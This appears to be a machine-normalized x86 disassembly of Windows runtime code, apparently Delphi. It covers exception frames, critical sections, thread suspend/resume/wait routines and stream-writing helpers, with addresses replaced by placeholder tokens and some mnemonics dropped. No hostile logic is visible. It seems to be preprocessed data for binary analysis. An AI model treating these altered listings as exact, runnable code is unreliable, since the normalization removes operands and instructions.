mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_417c20
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_417040
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419d0b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_4194bc
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_417c20
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_4166b0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417c20
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4107e8
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
lea eax [ ebp - 0x1c ]
call sub_40568c
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d1d0
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d12
mov eax [ ebp - 0xc ]
call sub_403294
retn
sub_419d74
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419f6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40ed44
mov eax [ ebp - 0x4 ]
call sub_417bfc
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
jmp [ eax * 4 + jump_table_419db6 ]
mov eax [ ebp - 0x4 ]
call sub_41965c
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41876c
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_410020
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41876c
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_410020
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41876c
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_410020
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418550
mov eax ebx
call sub_4100b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418594
mov eax ebx
call sub_4100b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4185d8
mov eax ebx
call sub_4100d8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418628
mov eax ebx
call sub_4100c4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4194bc
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4100ec
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_419578
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_410118
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41965c
cmp al 0x9
sete dl
mov eax ebx
call sub_410088
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_419bac
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f06c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4187d8
push edx
push eax
mov eax ebx
call sub_41005c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f75
lea eax [ ebp - 0x1c ]
call sub_40ed58
lea eax [ ebp - 0xc ]
call sub_404730
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov eax ebx
call sub_4108d0
jmp r-xdata
sub_419f7c
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_419fc8
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_419ff4
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41a164
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419f7c
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41a164
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_419f7c
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41a164
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_419f7c
jmp r-xdata
pop edx
pop ebx
retn
sub_41a078
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_40445c
je r-xdata
mov eax esi
call sub_404310
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404310
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41a164
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419f7c
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_419f7c
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41a164
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419f7c
mov dl 0x6
mov eax ebx
call sub_41a164
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_419f7c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_419f7c
sub_41a110
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a155
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405b00
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41a078
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a15c
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_41a210
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
call sub_41a1c4
mov eax ebx
call sub_41a1d0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41a39e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41a37f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a386
mov eax [ ebp - 0xc ]
call sub_403294
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_414170
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_414060
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41a349
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41a31a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41a3b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_41a1ec
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_41a3f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_404048
mov eax [ ebp - 0x4 ]
call sub_403294
sub_41a3f6
call sub_4027b4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_403a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_41a1ec
test bl bl
je r-xdata
mov eax esi
call sub_404048
mov eax [ ebp - 0x4 ]
call sub_403294
sub_41a458
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_41a502
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403264
call sub_41a1f8
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_41a3b0
xor edx edx
xor eax eax
call sub_404004
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_4035a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a509
lea eax [ ebp - 0x10 ]
call sub_404050
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40ad88
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
sub_41a528
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
mov eax [ esi + 0x38 ]
call sub_403294
call sub_41a204
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_41a898
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
mov eax esi
call sub_41a8a0
mov eax esi
call sub_41a870
sub_41a59c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_41a60a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a611
lea eax [ ebp - 0x14 ]
call sub_404050
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ad88
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
sub_41a658
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi + 0x4 ]
push eax
call SetThreadPriority
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_41a618
pop esi
pop ebx
retn
sub_41a684
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41a7a6
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41a788
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_414014
call sub_41a1ec
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41a769
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a770
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_41a7c4
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_41a684
pop ebp
retn 0x8
sub_41a804
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xe ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_41a851
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SuspendThread
test eax eax
setge dl
mov eax [ ebp - 0x4 ]
call sub_41a618
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a870
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_41a618
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_41a8a0
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_41a618
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_41a210
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_41a618
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_41a944
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_41aafc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41a990
push ebx
push esi
push ecx
call sub_403608
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41abe4
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_41ab8c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_414740
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41ab54
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4035f0
lea eax [ ebx + 0x14 ]
call sub_40d19c
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_414170
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41aa14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4141cc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_414014
mov edx ebx
mov eax esi
call sub_41aa14
sub_41aaa8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_414014
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x10 ] eax
sub_41aad4
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_41430c
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403294
xor eax eax
mov [ ebx + 0x10 ] eax
sub_41aafc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403490
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_41aaa8
mov dl 0x1
mov eax ebx
call sub_41b01c
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41afcc
sub_41ab54
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41b01c
mov edx ebx
mov eax esi
call sub_41aad4
pop edi
pop esi
pop ebx
retn
sub_41ab8c
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_414258
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41ab54
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_41aad4
sub_41abe4
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_414170
call sub_41abe4
inc edi
dec esi
jne r-xdata
sub_41ac20
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_41430c
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403294
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41ac44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ac20
mov edx ebx
mov eax esi
call sub_41ac20
pop esi
pop ebx
retn
sub_41ac60
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41ac44
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_414170
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41acbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_41aa68
push ebx
push sub_41aa90
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41aa7c
push ebx
push sub_41aa9c
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41adb4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407d14
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41ae4c
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
sub_41ae4c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_414170
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407d14
test al al
jne r-xdata
sub_41ae9c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_40445c
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407e98
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
xor edx edx
mov eax ebx
call sub_41b01c
mov edx esi
mov eax ebx
call sub_41af28
mov dl 0x1
mov eax ebx
call sub_41b01c
sub_41af3c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_414170
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4140fc
sub_41af78
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_4141cc
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_414060
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_4141ec
sub_41afcc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41af68
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41af3c
mov cl 0x1
mov edx ebx
call sub_41afcc
inc edi
dec ebp
jne r-xdata
sub_41b01c
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4042ec
mov edx esp
mov eax esi
call sub_403550
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41b064
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41b08c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41b0d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
